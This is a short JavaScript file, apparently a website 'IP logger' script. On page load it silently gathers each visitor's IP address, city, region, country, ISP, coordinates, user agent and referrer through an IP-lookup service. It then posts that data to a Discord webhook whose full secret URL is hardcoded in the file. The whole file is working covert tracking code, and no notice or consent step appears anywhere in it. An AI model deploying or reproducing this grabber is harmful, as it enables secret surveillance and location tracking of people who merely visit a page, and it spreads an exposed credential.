const DISCORD_WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1475243768910450711/xHfthm1ud7YaT_IbwsJ7Bhkrb9Obr58Fr0gKGXJiQMHSs0UJQMOqlgGqgzm26Oe7_8jl';

async function sendToDiscord(data) {
    try {
        const response = await fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                content: null,
                embeds: [
                    {
                        title: 'New Website Visitor',
                        color: 0x00ff00, 
                        fields: Object.entries(data).map(([name, value]) => ({
                            name,
                            value: String(value) || 'N/A',
                            inline: true,
                        })),
                        timestamp: new Date().toISOString(),
                    },
                ],
            }),
        });

        if (!response.ok) {
            console.error('Failed to send to Discord:', response.status, response.statusText);
        }
    } catch (error) {
        console.error('Error sending to Discord:', error);
    }
}


async function collectVisitorInfo() {
    try {
        const visitorData = {
            'User Agent': navigator.userAgent,
            'Referrer': document.referrer || 'Direct',
            'Page URL': window.location.href,
            'Timestamp': new Date().toLocaleString(),
        };

        const ipResponse = await fetch('https://ipapi.co/json/');
        if (!ipResponse.ok) {
            throw new Error(`ipapi.co responded with ${ipResponse.status}`);
        }

        const ipData = await ipResponse.json();

        visitorData['IP']          = ipData.ip         || 'Unknown';
        visitorData['City']        = ipData.city       || 'Unknown';
        visitorData['Region']      = ipData.region     || 'Unknown';
        visitorData['Country']     = ipData.country_name || 'Unknown';
        visitorData['ISP']         = ipData.org        || 'Unknown';
        visitorData['Latitude']    = ipData.latitude   ?? 'N/A';
        visitorData['Longitude']   = ipData.longitude  ?? 'N/A';


        await sendToDiscord(visitorData);
    } catch (error) {
        console.error('Error collecting visitor info:', error);

        await sendToDiscord({
            Error: 'Failed to collect visitor info',
            Details: error.message || String(error),
            Timestamp: new Date().toLocaleString(),
        });
    }
}

window.addEventListener('load', collectVisitorInfo);
